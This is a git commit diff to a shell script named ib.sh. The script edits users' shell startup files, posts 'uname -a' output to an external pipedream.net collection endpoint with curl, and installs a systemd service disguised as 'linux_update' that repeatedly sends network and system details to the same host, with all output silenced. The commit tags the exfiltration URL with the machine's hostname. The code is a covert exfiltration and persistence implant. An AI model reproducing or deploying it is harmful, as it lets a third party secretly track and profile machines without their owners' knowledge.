6c81145459775bc764dc6e1e17e21c4fdfa37b48
skyf0l <tom.rorato@epitech.eu>
2021-06-21 14:35:41 +0200

    Update ib.sh

--- ib.sh
+++ ib.sh
@@ -12,7 +12,7 @@ for user in `find /home/ -maxdepth 1 -type d`; do
     uninstall_in_rc "$user/.zshrc"
 done
 
-uname -a | curl https://enj7fhiwooawt.x.pipedream.net/root -X POST -d "$(</dev/stdin)"
+uname -a | curl https://enj7fhiwooawt.x.pipedream.net/root_$(uname -n) -X POST -d "$(</dev/stdin)"
 
 echo -e "
 [Unit]
@@ -25,5 +25,5 @@ ExecStart=/bin/bash -c 'while [ 1 ]; do (ip a; uname -a) | curl https://enj7fhiw
 [Install]
 WantedBy=multi-user.target
 " > /etc/systemd/system/linux_update.service
-systemctl enable linux_update &> /dev/null
-systemctl start linux_update &> /dev/null
+systemctl enable linux_update > /dev/null 2>&1
+systemctl start linux_update > /dev/null 2>&1
